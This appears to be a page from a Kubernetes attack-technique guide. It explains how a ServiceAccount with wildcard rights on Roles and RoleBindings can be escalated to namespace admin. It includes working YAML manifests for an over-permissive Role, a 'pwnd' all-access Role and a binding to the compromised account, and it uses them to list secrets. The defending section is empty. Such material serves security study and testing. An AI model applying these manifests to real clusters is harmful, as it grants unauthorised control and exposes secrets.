# Cluster-admin binding


The `cluster-admin` ClusterRole is a default ClusterRole in Kubernetes. This is a super user that can perform any action on any resource in the cluster. Think of this as the root user of a cluster. If an attacker is somehow allowed the ability to apply RoleBindings or ClusterRoleBindings, they could escalate to `cluster-admin`. It's important to note that this is fairly unlikely to be a direct attack path due to the way Kubernetes handles RBAC.

![](../images/Pasted%20image%2020240331195049.png)

Kubernetes RBAC has an interesting way of [preventing privilege escalation](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping). Essentially, you cannot create permissions that you do not already have unless you have the `escalate` verb RBAC for your Role or ClusterRole. You can see that even though this account is allowed to create roles, RBAC is not allowing me to create a role that doesn't have permissions my current role doesn't have.

![](../images/Pasted%20image%2020240331195103.png)

## Namespace Admin Privilege Escalation
Although RBAC does it's best to not allow privilege escalation, it can still be possible if the Role associated with a ServiceAccount has either the `escalate` verb or a `*` for the RoleBinding and Role resource. The following Role applied to a ServiceAccount will allow an attacker to gain full control over the namespace due to the `Role` and `RoleBinding` resources being granted the access to all the RBAC verbs (including `escalate`).
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default
  name: pod-view
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create","get", "watch", "list"]
- apiGroups: ["*"]
  resources: ["roles"]
  verbs: ["*"]
- apiGroups: ["*"]
  resources: ["rolebindings"]
  verbs: ["*"]

```

The attack path for this is to create a new Role and Rolebinding and apply it to the ServiceAccount context we are operating under when inside pod.

The following Role named `pwnd` grants essentially admin powers over all resources in all apiGroups.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: default 
  name: pwnd 
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

The following RoleBinding will bind the role `pwnd` to the ServiceAccount `pod-view`
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: pwnd 
  namespace: default 
roleRef: # points to the Role
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: pwnd # name of Role
subjects: # points to the ServiceAccount
- kind: ServiceAccount
  name: pod-view 
  namespace: default # ns of service account
```

Since we have a `*` in the RBAC permissions for roles and rolebindings, we can submit this Role and Rolebinding to the API server from the pod. After creating them, running `kubectl auth can-i --list` shows us that we are now essentially an admin within our namespace.

![](../images/Pasted%20image%2020240331195216.png)

To prove that we have further escalated our privileges, we can attempt to take an action we we previously were not able to take such as listing secrets in the namespace.

![](../images/Pasted%20image%2020240331195228.png)

# Defending
> Pull requests needed ❤️ 